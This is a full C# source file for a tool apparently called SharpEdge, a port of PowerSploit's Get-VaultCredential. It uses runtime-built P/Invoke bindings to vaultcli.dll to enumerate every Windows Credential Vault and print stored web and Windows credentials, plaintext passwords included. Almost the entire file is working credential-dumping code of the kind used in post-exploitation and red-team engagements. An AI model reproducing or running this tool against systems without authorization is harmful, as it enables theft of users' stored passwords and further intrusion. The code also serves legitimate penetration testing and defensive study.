using System;
using System.Collections.Generic;
using System.Text;
using System.Reflection;
using System.Reflection.Emit;
using System.IO;

/*
 * Author: Dwight Hohnstein (@djhohnstein)
 * 
 * This is a C# implementation of Get-VaultCredential
 * from @mattifestation, whose PowerShell source is here:
 * https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-VaultCredential.ps1
 */

namespace SharpEdge
{
    class Program
    {
        unsafe static void Main(string[] args)
        {
            Console.WriteLine("[*] Searching the Vaults...");
            var OSVersion = Environment.OSVersion.Version;
            var OSMajor = OSVersion.Major;
            var OSMinor = OSVersion.Minor;

            /* Begin PInvoke Region */
            var DynAssembly = new System.Reflection.AssemblyName("VaultUtil");
            var AssemblyBuilder = System.AppDomain.CurrentDomain.DefineDynamicAssembly(DynAssembly, System.Reflection.Emit.AssemblyBuilderAccess.Run);
            var ModuleBuilder = AssemblyBuilder.DefineDynamicModule("VaultUtil", false);

            var EnumBuilder = ModuleBuilder.DefineEnum("VaultLib.VAULT_ELEMENT_TYPE", TypeAttributes.Public, typeof(Int32));
            EnumBuilder.DefineLiteral("Undefined", -1);
            EnumBuilder.DefineLiteral("Boolean", 0);
            EnumBuilder.DefineLiteral("Short", 1);
            EnumBuilder.DefineLiteral("UnsignedShort", 2);
            EnumBuilder.DefineLiteral("Int", 3);
            EnumBuilder.DefineLiteral("UnsignedInt", 4);
            EnumBuilder.DefineLiteral("Double", 5);
            EnumBuilder.DefineLiteral("Guid", 6);
            EnumBuilder.DefineLiteral("String", 7);
            EnumBuilder.DefineLiteral("ByteArray", 8);
            EnumBuilder.DefineLiteral("TimeStamp", 9);
            EnumBuilder.DefineLiteral("ProtectedArray", 10);
            EnumBuilder.DefineLiteral("Attribute", 11);
            EnumBuilder.DefineLiteral("Sid", 12);
            EnumBuilder.DefineLiteral("Last", 13);
            var VAULT_ELEMENT_TYPE = EnumBuilder.CreateType();

            EnumBuilder = ModuleBuilder.DefineEnum("VaultLib.VAULT_SCHEMA_ELEMENT_ID", TypeAttributes.Public, typeof(Int32));
            EnumBuilder.DefineLiteral("Illegal", 0);
            EnumBuilder.DefineLiteral("Resource", 1);
            EnumBuilder.DefineLiteral("Identity", 2);
            EnumBuilder.DefineLiteral("Authenticator", 3);
            EnumBuilder.DefineLiteral("Tag", 4);
            EnumBuilder.DefineLiteral("PackageSid", 5);
            EnumBuilder.DefineLiteral("AppStart", 100);
            EnumBuilder.DefineLiteral("AppEnd", 10000);
            var VAULT_SCHEMA_ELEMENT_ID = EnumBuilder.CreateType();

            Type[] LayoutConstructorArgs = new Type[] { typeof(System.Runtime.InteropServices.LayoutKind) }; 
            ConstructorInfo LayoutConstructor = typeof(System.Runtime.InteropServices.StructLayoutAttribute).GetConstructor(LayoutConstructorArgs);
            var CharsetField = typeof(System.Runtime.InteropServices.StructLayoutAttribute).GetField("CharSet");

            Object[] ConstructorArgs = new Object[] { System.Runtime.InteropServices.LayoutKind.Explicit };
            FieldInfo[] FieldInfoArgs = new FieldInfo[] { CharsetField };
            Object[] FieldValueArgs = new Object[] { System.Runtime.InteropServices.CharSet.Ansi };
            var StructLayoutCustomAttribute = new System.Reflection.Emit.CustomAttributeBuilder(
                LayoutConstructor,
                ConstructorArgs,
                FieldInfoArgs,
                FieldValueArgs
            );
            
            // VAULT_ITEM
            var TypeBuilder = ModuleBuilder.DefineType(
                "VaultLib.VAULT_ITEM",
                TypeAttributes.AutoLayout | TypeAttributes.AnsiClass | TypeAttributes.Class | TypeAttributes.Public | TypeAttributes.SequentialLayout | TypeAttributes.Sealed | TypeAttributes.BeforeFieldInit,
                typeof(Object),
                (int) System.Reflection.Emit.PackingSize.Size4
            );
            TypeBuilder.DefineField("SchemaId", typeof(System.Guid), FieldAttributes.Public);
            TypeBuilder.DefineField("pszCredentialFriendlyName", typeof(System.IntPtr), FieldAttributes.Public);
            TypeBuilder.DefineField("pResourceElement", typeof(IntPtr), FieldAttributes.Public);
            TypeBuilder.DefineField("pIdentityElement", typeof(IntPtr), FieldAttributes.Public);
            TypeBuilder.DefineField("pAuthenticatorElement", typeof(IntPtr), FieldAttributes.Public);
            if (OSMajor >= 6 && OSMinor >= 2)
            {
                TypeBuilder.DefineField("pPackageSid", typeof(IntPtr), FieldAttributes.Public);
            }
            TypeBuilder.DefineField("LastModified", typeof(UInt64), FieldAttributes.Public);
            TypeBuilder.DefineField("dwFlags", typeof(UInt32), FieldAttributes.Public);
            TypeBuilder.DefineField("dwPropertiesCount", typeof(UInt32), FieldAttributes.Public);
            TypeBuilder.DefineField("pPropertyElements", typeof(IntPtr), FieldAttributes.Public);
            var VAULT_ITEM = TypeBuilder.CreateType();

            // VAULT_ITEM_ELEMENT
            TypeBuilder = ModuleBuilder.DefineType(
                "VaultLib.VAULT_ITEM_ELEMENT",
                TypeAttributes.AutoLayout | TypeAttributes.AnsiClass | TypeAttributes.Class | TypeAttributes.Public | TypeAttributes.SequentialLayout | TypeAttributes.Sealed | TypeAttributes.BeforeFieldInit,
                typeof(object),
                (int) System.Reflection.Emit.PackingSize.Size4
            );
            TypeBuilder.SetCustomAttribute(StructLayoutCustomAttribute);
            TypeBuilder.DefineField("SchemaElementId", VAULT_SCHEMA_ELEMENT_ID, FieldAttributes.Public).SetOffset(0);
            TypeBuilder.DefineField("Type", VAULT_ELEMENT_TYPE, FieldAttributes.Public).SetOffset(8);
            var VAULT_ITEM_ELEMENT = TypeBuilder.CreateType();

            // Vaultcli
            TypeBuilder = ModuleBuilder.DefineType("VaultLib.Vaultcli", TypeAttributes.Public | TypeAttributes.Class);
            Type[] PInvokeTypeArgs = new Type[] { typeof(Guid*), typeof(UInt32), typeof(IntPtr*) };
            TypeBuilder.DefinePInvokeMethod(
                    "VaultOpenVault",
                    "vaultcli.dll",
                    MethodAttributes.Public | MethodAttributes.Static,
                    System.Reflection.CallingConventions.Standard,
                    typeof(Int32),
                    PInvokeTypeArgs,
                    System.Runtime.InteropServices.CallingConvention.Winapi,
                    System.Runtime.InteropServices.CharSet.Auto
                );

            PInvokeTypeArgs = new Type[] { typeof(IntPtr*) };
            TypeBuilder.DefinePInvokeMethod(
                    "VaultCloseVault",
                    "vaultcli.dll",
                    MethodAttributes.Public | MethodAttributes.Static,
                    System.Reflection.CallingConventions.Standard,
                    typeof(Int32),
                    PInvokeTypeArgs,
                    System.Runtime.InteropServices.CallingConvention.Winapi,
                    System.Runtime.InteropServices.CharSet.Auto
                );

            TypeBuilder.DefinePInvokeMethod(
                    "VaultFree",
                    "vaultcli.dll",
                    MethodAttributes.Public | MethodAttributes.Static,
                    System.Reflection.CallingConventions.Standard,
                    typeof(Int32),
                    PInvokeTypeArgs,
                    System.Runtime.InteropServices.CallingConvention.Winapi,
                    System.Runtime.InteropServices.CharSet.Auto
                );

            PInvokeTypeArgs = new Type[] { typeof(Int32), typeof(Int32*), typeof(IntPtr*) };
            TypeBuilder.DefinePInvokeMethod(
                    "VaultEnumerateVaults",
                    "vaultcli.dll",
                    MethodAttributes.Public | MethodAttributes.Static,
                    System.Reflection.CallingConventions.Standard,
                    typeof(Int32),
                    PInvokeTypeArgs,
                    System.Runtime.InteropServices.CallingConvention.Winapi,
                    System.Runtime.InteropServices.CharSet.Auto
                );

            PInvokeTypeArgs = new Type[] { typeof(IntPtr), typeof(Int32), typeof(Int32*), typeof(IntPtr*) };
            TypeBuilder.DefinePInvokeMethod(
                    "VaultEnumerateItems",
                    "vaultcli.dll",
                    MethodAttributes.Public | MethodAttributes.Static,
                    System.Reflection.CallingConventions.Standard,
                    typeof(Int32),
                    PInvokeTypeArgs,
                    System.Runtime.InteropServices.CallingConvention.Winapi,
                    System.Runtime.InteropServices.CharSet.Auto
                );

            if (OSMajor >= 6 && OSMinor >= 2)
            {
                PInvokeTypeArgs = new Type[]
                {
                    typeof(IntPtr),
                    typeof(Guid*),
                    typeof(IntPtr),
                    typeof(IntPtr),
                    typeof(IntPtr),
                    typeof(IntPtr),
                    typeof(Int32),
                    typeof(IntPtr*)
                };
            }
            else
            {
                PInvokeTypeArgs = new Type[]
                {
                    typeof(IntPtr),
                    typeof(Guid*),
                    typeof(IntPtr),
                    typeof(IntPtr),
                    typeof(IntPtr),
                    typeof(Int32),
                    typeof(IntPtr*)
                };
            }
            TypeBuilder.DefinePInvokeMethod(
                    "VaultGetItem",
                    "vaultcli.dll",
                    MethodAttributes.Public | MethodAttributes.Static,
                    System.Reflection.CallingConventions.Standard,
                    typeof(Int32),
                    PInvokeTypeArgs,
                    System.Runtime.InteropServices.CallingConvention.Winapi,
                    System.Runtime.InteropServices.CharSet.Auto
                );
            /* Define the VaultCli and Methods we'll be calling */
            Type VaultCli = TypeBuilder.CreateType();
            MethodInfo VaultEnumerateVaults = VaultCli.GetMethod("VaultEnumerateVaults");
            MethodInfo VaultOpenVault = VaultCli.GetMethod("VaultOpenVault");
            MethodInfo VaultEnumerateItems = VaultCli.GetMethod("VaultEnumerateItems");
            MethodInfo VaultGetItem = VaultCli.GetMethod("VaultGetItem");
            /* End PInvoke Region */

            /* Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct */
            object GetVaultElementValue(IntPtr vaultElementPtr)
            {
                object results;
                object partialElement = System.Runtime.InteropServices.Marshal.PtrToStructure(vaultElementPtr, VAULT_ITEM_ELEMENT);
                FieldInfo partialElementInfo = partialElement.GetType().GetField("Type");
                var partialElementType = partialElementInfo.GetValue(partialElement);

                IntPtr elementPtr = (IntPtr) (vaultElementPtr.ToInt64() + 16);
                switch((int)partialElementType)
                {
                    case 7: // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!
                        IntPtr StringPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
                        results = System.Runtime.InteropServices.Marshal.PtrToStringUni(StringPtr);
                        break;
                    case 0: // VAULT_ELEMENT_TYPE == bool
                        results = System.Runtime.InteropServices.Marshal.ReadByte(elementPtr);
                        results = (bool) results;
                        break;
                    case 1: // VAULT_ELEMENT_TYPE == Short
                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
                        break;
                    case 2: // VAULT_ELEMENT_TYPE == Unsigned Short
                        results = System.Runtime.InteropServices.Marshal.ReadInt16(elementPtr);
                        break;
                    case 3: // VAULT_ELEMENT_TYPE == Int
                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
                        break;
                    case 4: // VAULT_ELEMENT_TYPE == Unsigned Int
                        results = System.Runtime.InteropServices.Marshal.ReadInt32(elementPtr);
                        break;
                    case 5: // VAULT_ELEMENT_TYPE == Double
                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Double));
                        break;
                    case 6: // VAULT_ELEMENT_TYPE == GUID
                        results = System.Runtime.InteropServices.Marshal.PtrToStructure(elementPtr, typeof(Guid));
                        break;
                    case 12: // VAULT_ELEMENT_TYPE == Sid
                        IntPtr sidPtr = System.Runtime.InteropServices.Marshal.ReadIntPtr(elementPtr);
                        var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);
                        results = sidObject.Value;
                        break;
                    default:
                        /* Several VAULT_ELEMENT_TYPES are currently unimplemented according to
                         * Lord Graeber. Thus we do not implement them. */
                        results = null;
                        break;
                }
                return results;
            }
            /* End helper function */

            Int32 vaultCount = 0;
            Int32* vaultCountPtr = &vaultCount;
            object boxedVaultCountPtr = Pointer.Box(vaultCountPtr, typeof(Int32*));
            IntPtr vaultGuidPtr = IntPtr.Zero;
            // Lord help me for this naming convention
            IntPtr* vaultGuidPtrPtr = &vaultGuidPtr;
            object boxedVaultGuidPtr = Pointer.Box(vaultGuidPtrPtr, typeof(IntPtr*));

            object[] vaultEnumVaultArgs = { 0, boxedVaultCountPtr, boxedVaultGuidPtr };
            var result = VaultEnumerateVaults.Invoke(null, vaultEnumVaultArgs);
            //var result = CallVaultEnumerateVaults(VaultEnum, 0, ref vaultCount, ref vaultGuidPtr);

            if ((int)result != 0)
            {
                throw new Exception("[ERROR] Unable to enumerate vaults. Error (0x" + result.ToString() + ")");
            }

            // Create dictionary to translate Guids to human readable elements
            IntPtr guidAddress = vaultGuidPtr;
            Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>();
            vaultSchema.Add(new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note");
            vaultSchema.Add(new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential");
            vaultSchema.Add(new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector");
            vaultSchema.Add(new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials");
            vaultSchema.Add(new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials");
            vaultSchema.Add(new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential");
            vaultSchema.Add(new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential");
            vaultSchema.Add(new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential");
            vaultSchema.Add(new Guid("00000000-0000-0000-0000-000000000000"), null);

            for (int i = 0; i < vaultCount; i++)
            {
                // Open vault block
                object vaultGuidString = System.Runtime.InteropServices.Marshal.PtrToStructure(guidAddress, typeof(Guid));
                Guid vaultGuid = new Guid(vaultGuidString.ToString());
                Guid* tmpVaultGuidPtr = &vaultGuid;
                boxedVaultGuidPtr = Pointer.Box(tmpVaultGuidPtr, typeof(Guid*));
                guidAddress = (IntPtr)(guidAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(typeof(Guid)));
                IntPtr vaultHandle = IntPtr.Zero;
                IntPtr* vaultHandlePtr = &vaultHandle;
                object boxedVaultHandlePtr = Pointer.Box(vaultHandlePtr, typeof(IntPtr*));
                string vaultType;
                if (vaultSchema.ContainsKey(vaultGuid))
                {
                    vaultType = vaultSchema[vaultGuid];
                }
                else
                {
                    vaultType = vaultGuid.ToString();
                }
                object[] openVaultArgs = { boxedVaultGuidPtr, (UInt32) 0, boxedVaultHandlePtr };
                result = VaultOpenVault.Invoke(null, openVaultArgs);
                if ((int) result != 0)
                {
                    throw new Exception("Unable to open the following vault: " + vaultType + ". Error: 0x" + result.ToString());
                }
                // Vault opened successfully! Continue.

                // Fetch all items within Vault
                int vaultItemCount = 0;
                int* vaultItemCountPtr = &vaultItemCount;
                object boxedVaultItemCountPtr = Pointer.Box(vaultItemCountPtr, typeof(int*));
                IntPtr vaultItemPtr = IntPtr.Zero;
                IntPtr* vaultItemPtrPtr = &vaultItemPtr;
                object boxedVaultItemPtr = Pointer.Box(vaultItemPtrPtr, typeof(IntPtr*));
                object[] vaultEnumerateItemsArgs = { vaultHandle, 512,  boxedVaultItemCountPtr, boxedVaultItemPtr};
                result = VaultEnumerateItems.Invoke(null, vaultEnumerateItemsArgs);
                if ((int) result != 0)
                {
                    throw new Exception("[ERROR] Unable to enumerate vault items from the following vault: " + vaultType + ". Error 0x" + result.ToString());
                }
                var structAddress = vaultItemPtr;
                if (vaultItemCount > 0)
                {
                    // For each vault item...
                    for (int j = 1; j <= vaultItemCount; j++)
                    {
                        // Begin fetching vault item...
                        var currentItem = System.Runtime.InteropServices.Marshal.PtrToStructure(structAddress, VAULT_ITEM);
                        structAddress = (IntPtr)(structAddress.ToInt64() + System.Runtime.InteropServices.Marshal.SizeOf(VAULT_ITEM));
                        
                        IntPtr passwordVaultItem = IntPtr.Zero;
                        IntPtr* passwordVaultPtr = &passwordVaultItem;
                        object boxedPasswordVaultPtr = Pointer.Box(passwordVaultPtr, typeof(IntPtr*));
                        // Field Info retrieval
                        FieldInfo schemaIdInfo = currentItem.GetType().GetField("SchemaId");
                        Guid schemaId = new Guid(schemaIdInfo.GetValue(currentItem).ToString());
                        Guid* schemaIdPtr = &schemaId;
                        object boxedSchemaIdPtr = Pointer.Box(schemaIdPtr, typeof(Guid*));
                        FieldInfo pResourceElementInfo = currentItem.GetType().GetField("pResourceElement");
                        IntPtr pResourceElement = (IntPtr)pResourceElementInfo.GetValue(currentItem);
                        FieldInfo pIdentityElementInfo = currentItem.GetType().GetField("pIdentityElement");
                        IntPtr pIdentityElement = (IntPtr)pIdentityElementInfo.GetValue(currentItem);
                        FieldInfo dateTimeInfo = currentItem.GetType().GetField("LastModified");
                        UInt64 lastModified = (UInt64) dateTimeInfo.GetValue(currentItem);
                        
                        object[] vaultGetItemArgs;
                        if (OSMajor >= 6 && OSMinor >= 2)
                        {
                            vaultGetItemArgs = new object[8];
                            vaultGetItemArgs[0] = vaultHandle;
                            vaultGetItemArgs[1] = boxedSchemaIdPtr;
                            vaultGetItemArgs[2] = pResourceElement;
                            vaultGetItemArgs[3] = pIdentityElement;
                            // Newer versions have package sid
                            FieldInfo pPackageSidInfo = currentItem.GetType().GetField("pPackageSid");
                            IntPtr pPackageSid = (IntPtr)pPackageSidInfo.GetValue(currentItem);
                            vaultGetItemArgs[4] = pPackageSid;
                            vaultGetItemArgs[5] = IntPtr.Zero;
                            vaultGetItemArgs[6] = 0;
                            vaultGetItemArgs[7] = boxedPasswordVaultPtr;
                        }
                        else
                        {
                            vaultGetItemArgs = new object[7];
                            vaultGetItemArgs[0] = vaultHandle;
                            vaultGetItemArgs[1] = boxedSchemaIdPtr;
                            vaultGetItemArgs[2] = pResourceElement;
                            vaultGetItemArgs[3] = pIdentityElement;
                            vaultGetItemArgs[4] = IntPtr.Zero;
                            vaultGetItemArgs[5] = 0;
                            vaultGetItemArgs[6] = boxedPasswordVaultPtr;
                        }
                        // Where the actual fetching happens
                        result = VaultGetItem.Invoke(null, vaultGetItemArgs);
                        if ((int) result != 0)
                        {
                            throw new Exception("Error occured while retrieving vault item. Error: 0x" + result.ToString());
                        }
                        object passwordItem = System.Runtime.InteropServices.Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);
                        FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField("pAuthenticatorElement");
                        IntPtr pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem);
                        // Fetch the credential from the authenticator element
                        object cred = GetVaultElementValue(pAuthenticatorElement);
                        object packageSid = null;
                        if (vaultGetItemArgs.Length == 8 && (IntPtr)vaultGetItemArgs[4] != IntPtr.Zero)
                        {
                            packageSid = GetVaultElementValue((IntPtr)vaultGetItemArgs[4]);
                        }
                        if (cred != null) // Indicates successful fetch
                        {
                            Console.WriteLine("--- Result ---");
                            Console.WriteLine("Vault Type   : {0}", vaultType);
                            object resource = GetVaultElementValue(pResourceElement);
                            if (resource != null)
                            {
                                Console.WriteLine("Resource     : {0}", resource);
                            }
                            object identity = GetVaultElementValue(pIdentityElement);
                            if (identity != null)
                            {
                                Console.WriteLine("Identity     : {0}", identity);
                            }
                            if (packageSid != null)
                            {
                                Console.WriteLine("PacakgeSid  : {0}", packageSid);
                            }
                            Console.WriteLine("Credential   : {0}", cred);
                            // Stupid datetime
                            Console.WriteLine("LastModified : {0}", System.DateTime.FromFileTimeUtc((long)lastModified));
                        }
                    }
                }
            }
            Console.WriteLine("[*] All vaults searched. Exiting.");
        }
    }
}
